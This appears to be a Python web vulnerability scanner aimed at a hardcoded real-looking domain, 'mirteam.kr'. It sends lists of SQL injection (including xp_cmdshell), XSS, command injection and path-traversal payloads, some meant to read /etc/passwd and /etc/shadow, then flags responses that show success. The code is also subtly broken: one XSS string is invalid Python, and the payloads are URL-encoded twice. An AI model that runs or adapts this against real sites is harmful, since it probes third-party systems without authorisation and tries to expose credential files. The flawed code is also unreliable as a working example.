import requests
import urllib.parse
import logging
from typing import List, Dict

# Configure logging
logging.basicConfig(level=logging.INFO, filename='scanner.log', filemode='w', 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def define_payloads() -> Dict[str, List[str]]:
    """Define an array of POC payloads targeting common vulnerabilities."""
    payloads = {
        "SQL Injection": [
            "' OR '1'='1", 
            "' UNION SELECT NULL, NULL --", 
            """'; EXEC xp_cmdshell('whoami'); --"""
        ],
        "XSS": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "">"><script>alert('XSS')</script>"
        ],
        "Command Injection": [
            "; ls -la", 
            "| cat /etc/passwd", 
            "`whoami`"
        ],
        "File Inclusion": [
            "../../etc/passwd", 
            "../etc/shadow", 
            "/etc/hosts"
        ]
    }
    return payloads

def send_get_request(url: str, params: Dict[str, str]) -> requests.Response:
    """Send a GET request with payloads injected into the query parameters."""
    try:
        response = requests.get(url, params=params, timeout=10)
        logging.info(f"Request URL: {response.url}")
        logging.info(f"Response Code: {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None

def analyze_response(response: requests.Response, payload: str) -> bool:
    """Analyze server response for signs of vulnerability exploitation."""
    if response is None:
        return False

    indicators = [
        "syntax error", "unexpected", "alert('XSS')", "root:x", "<title>500", "Command not found"
    ]

    for indicator in indicators:
        if indicator.lower() in response.text.lower():
            logging.info(f"Vulnerability detected with payload: {payload}")
            logging.info(f"Response snippet: {response.text[:200]}...")
            return True

    return False

def generate_report(vulnerabilities: List[Dict[str, str]]) -> None:
    """Generate a structured report detailing identified vulnerabilities."""
    report = "Vulnerability Scan Report\n" + "="*30 + "\n\n"

    for vuln in vulnerabilities:
        report += f"URL: {vuln['url']}\n"
        report += f"Payload: {vuln['payload']}\n"
        report += f"Vulnerability Type: {vuln['type']}\n"
        report += f"Severity: {vuln['severity']}\n\n"

    with open('scan_report.txt', 'w') as f:
        f.write(report)
    logging.info("Report generated: scan_report.txt")

def main():
    """Main function to execute the scanning process."""
    target_url = "http://mirteam.kr"
    test_params = {"search": ""}  # Example parameter to inject payloads

    payloads = define_payloads()
    vulnerabilities = []

    for vuln_type, payload_list in payloads.items():
        for payload in payload_list:
            encoded_payload = urllib.parse.quote(str(payload))
            test_params["search"] = encoded_payload

            response = send_get_request(target_url, test_params)
            if analyze_response(response, payload):
                vulnerabilities.append({
                    "url": response.url,
                    "payload": payload,
                    "type": vuln_type,
                    "severity": "High"  # Default severity, adjust as needed
                })

    generate_report(vulnerabilities)

if __name__ == "__main__":
    main()
